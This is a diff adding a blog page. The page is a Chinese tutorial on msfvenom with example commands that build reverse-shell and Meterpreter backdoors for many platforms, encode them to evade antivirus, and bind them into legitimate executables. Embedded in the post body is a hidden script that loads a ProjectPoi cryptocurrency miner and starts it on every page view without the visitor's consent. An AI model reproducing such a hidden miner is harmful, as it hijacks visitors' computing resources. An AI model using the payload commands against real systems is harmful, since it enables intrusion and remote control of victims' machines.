@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Damit 5">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="MSFvenom使用总结"/>
+  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
+  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://yoursite.com"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Damit5's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">MSFvenom使用总结</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Damit 5</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2017-09-30</span>
+            <span class="time">12:37:17</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/Metasploit-Framework/">#Metasploit-Framework</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <script src="/assets/js/APlayer.min.js"> </script><a id="more"></a>
+<div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer0"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "http://damit5.kiwi/Music/233.jpg",
+				}
+			});
+		</script>
+
+<html>
+<head>
+<script>
+var script = document.createElement("script");
+script.type = "text/javascript";
+script.src = "https://ppoi.org/lib/projectpoi.min.js";
+script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
+document.getElementsByTagName("head")[0].appendChild(script);
+</script>
+</head>
+</html>
+
+<h2 id="0×00-参数介绍"><a href="#0×00-参数介绍" class="headerlink" title="0×00 参数介绍"></a>0×00 参数介绍</h2><p>Msfvenom是有效载荷生成和编码的组合，它于2015年6月8日取代了msfpayload和msfencode</p>
+<p>再开始使用msfvenom前，请先看看它支持的选项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -h</div></pre></td></tr></table></figure>
+<p><img src="http://damit5.ml/usr/uploads/BLOG/msfvenom/msfvenom.png" alt="msfvenom"></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-p, --payload           #添加载荷payload</div><div class="line">    --payload-options   #列出payload选项</div></pre></td></tr></table></figure>
+<p>载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了</p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-l, --list              #查看所有payload、encoder、nops</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-f, --format            #输出文件的格式</div><div class="line">    --help-formats      #列出所有文件格式</div></pre></td></tr></table></figure>
+<h4 id="可执行的格式-Executable-formats"><a href="#可执行的格式-Executable-formats" class="headerlink" title="可执行的格式 ( Executable formats )"></a>可执行的格式 ( Executable formats )</h4><p>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war</p>
+<h4 id="需要变换的格式-Transform-formats"><a href="#需要变换的格式-Transform-formats" class="headerlink" title="需要变换的格式: ( Transform formats )"></a>需要变换的格式: ( Transform formats )</h4><p>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-e, --encoder           #编码免杀</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-a, --arch             #选择架构</div><div class="line">    --platform         #选择平台</div><div class="line">    --help-platforms   #列出可选择的平台</div></pre></td></tr></table></figure>
+<h4 id="选择架构平台"><a href="#选择架构平台" class="headerlink" title="选择架构平台"></a>选择架构平台</h4><p>x86 | x64 | x86_64</p>
+<h4 id="Platforms"><a href="#Platforms" class="headerlink" title="Platforms:"></a>Platforms:</h4><p>windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-s, --space             #生成payload的最大长度，就是文件大小</div><div class="line">    --encoder-space     #生成编码payload的最大长度</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-b, --bad-chars         #避免使用的字符 例如：不使用 &apos;\x00&apos;</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-i, --iterations        #编码次数</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c, --add-code           #添加自己的shellcode</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-o, --out               #文件输出</div></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x | -k                 #将后门捆绑到程序上</div></pre></td></tr></table></figure>
+<h2 id="0×01-Msfvenom实例"><a href="#0×01-Msfvenom实例" class="headerlink" title="0×01 Msfvenom实例"></a>0×01 Msfvenom实例</h2><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure>
+<h4 id="编码处理型"><a href="#编码处理型" class="headerlink" title="编码处理型"></a>编码处理型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt;  -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div></pre></td></tr></table></figure>
+<h4 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x /root/test.exe -k -f exe -o /root/shell.exe</div></pre></td></tr></table></figure>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div><div class="line"></div><div class="line">Msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure>
+<h4 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div></pre></td></tr></table></figure>
+<h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
+<h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx</div></pre></td></tr></table></figure>
+<h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
+<h4 id="War"><a href="#War" class="headerlink" title="War"></a>War</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
+<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="How-to-use-msfvenom"><a href="#How-to-use-msfvenom" class="headerlink" title="How-to-use-msfvenom"></a><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="external">How-to-use-msfvenom</a></h3><h3 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">MSFvenom</a></h3>
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
